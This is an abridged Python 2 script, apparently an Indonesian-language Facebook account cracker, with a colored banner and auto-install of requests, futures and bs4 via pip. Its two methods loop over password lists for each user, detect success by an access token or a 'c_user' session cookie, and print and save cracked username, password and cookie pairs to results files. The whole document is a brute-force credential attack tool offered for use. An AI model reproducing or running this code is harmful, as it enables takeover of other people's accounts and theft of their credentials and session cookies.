...
try:
    ...
    print '\n [×] Modul requests belum terinstall ngab!!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall ngab!!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [×] Modul Bs4 belum terinstall ngab!!...\n'
...
\033[0;96m/_/  /_/\_,_/_/\__/_/ /____/_/\033[0;91mv2.0 \033[0m|•|Facebook Saya Aang'''
    ...
    def __api__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                ...
                print '\r  %sCP NGAB : %s • %s                %s' % (K,user,pw,N)
                wrt = ' [×]  %s • %s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print '\r  %sOK NGAB : %s • %s • %s                 %s' % (H,user,pw,kuki,N)
